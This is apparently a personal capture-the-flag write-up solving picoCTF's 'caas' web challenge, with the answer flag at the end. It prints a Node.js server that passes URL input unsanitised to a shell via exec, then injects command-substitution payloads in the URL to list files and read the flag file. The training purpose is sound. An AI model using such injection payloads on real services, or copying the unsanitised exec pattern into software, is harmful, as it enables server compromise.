# picoGym Level 202: caas
Source: https://play.picoctf.org/practice/challenge/202

## Goal
Now presenting cowsay as a service <br>
https://caas.mars.picoctf.net/<br>
Challenge Endpoints<br>
https://artifacts.picoctf.net/picoMini+by+redpwn/Web+Exploitation/caas/index.js

## What I learned
```
Command Substitution: https://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html#tag_18_06_03

URL encoding (percent-encoding)
	space ( ) becomes %20 in URLs
	%20 specifically is hexadecimal ASCII code for space (0x20)
```

## Solution
```
https://webshell.picoctf.org/

AsianHacker-picoctf@webshell:~$ cd /tmp/ ⌨️
AsianHacker-picoctf@webshell:/tmp$ wget https://artifacts.picoctf.net/picoMini+by+redpwn/Web+Exploitation/caas/index.js ⌨️
--2025-09-02 21:19:47--  https://artifacts.picoctf.net/picoMini+by+redpwn/Web+Exploitation/caas/index.js
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 3.170.131.72, 3.170.131.77, 3.170.131.33, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|3.170.131.72|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 424 [binary/octet-stream]
Saving to: 'index.js'

index.js                                                   100%[======================================================================================================================================>]     424  --.-KB/s    in 0s      

2025-09-02 21:19:47 (153 MB/s) - 'index.js' saved [424/424]

AsianHacker-picoctf@webshell:/tmp$ cat index.js ⌨️
const express = require('express');
const app = express();
const { exec } = require('child_process');

app.use(express.static('public'));

app.get('/cowsay/:message', (req, res) => {
  exec(`/usr/games/cowsay ${req.params.message}`, {timeout: 5000}, (error, stdout) => {
    if (error) return res.status(500).end();
    res.type('txt').send(stdout).end();
  });
});

app.listen(3000, () => {
  console.log('listening');
});

Browser: https://caas.mars.picoctf.net/ ⌨️
Cowsay as a Service
Make a request to the following URL to cowsay your message:
https://caas.mars.picoctf.net/cowsay/{message}

Browser: https://caas.mars.picoctf.net/cowsay/`ls -la` ⌨️
Converted: https://caas.mars.picoctf.net/cowsay/%60ls%20-la%60
 _________________________________________
/ total 52 drwxr-xr-x 1 root root 4096    \
| Jun 16 2021 . drwxr-xr-x 1 root root    |
| 4096 May 14 15:50 .. -rw-r--r-- 1 root  |
| root 14 May 5 2021 .dockerignore        |
| -rw-r--r-- 1 root root 278 May 5 2021   |
| Dockerfile -rw-r--r-- 1 root root 73    |
| May 5 2021 falg.txt -rw-r--r-- 1 root   |
| root 424 Jun 16 2021 index.js           |
| drwxr-xr-x 52 root root 4096 May 5 2021 |
| node_modules -rw-r--r-- 1 root root 135 |
| May 5 2021 package.json drwxr-xr-x 2    |
| root root 4096 May 5 2021 public        |
| -rw-r--r-- 1 root root 14600 May 5 2021 |
\ yarn.lock                               /
 -----------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||

Browser: https://caas.mars.picoctf.net/cowsay/$(ls%20-la) ⌨️
Converted: https://caas.mars.picoctf.net/cowsay/$(ls%20-la)
 _________________________________________
/ total 52 drwxr-xr-x 1 root root 4096    \
| Jun 16 2021 . drwxr-xr-x 1 root root    |
| 4096 May 14 15:50 .. -rw-r--r-- 1 root  |
| root 14 May 5 2021 .dockerignore        |
| -rw-r--r-- 1 root root 278 May 5 2021   |
| Dockerfile -rw-r--r-- 1 root root 73    |
| May 5 2021 falg.txt -rw-r--r-- 1 root   |
| root 424 Jun 16 2021 index.js           |
| drwxr-xr-x 52 root root 4096 May 5 2021 |
| node_modules -rw-r--r-- 1 root root 135 |
| May 5 2021 package.json drwxr-xr-x 2    |
| root root 4096 May 5 2021 public        |
| -rw-r--r-- 1 root root 14600 May 5 2021 |
\ yarn.lock                               /
 -----------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||

Browser: https://caas.mars.picoctf.net/cowsay/$(cat%20falg.txt) ⌨️
Converted: https://caas.mars.picoctf.net/cowsay/$(cat%20falg.txt)
 _________________________________________
/ picoCTF{moooooooooooooooooooooooooooooo \
\ oooooooooooooooooooooooooooooo0o}       / 🔐
 -----------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

## Flag
picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}

## Continue
[Continue](./picoGym0445.md)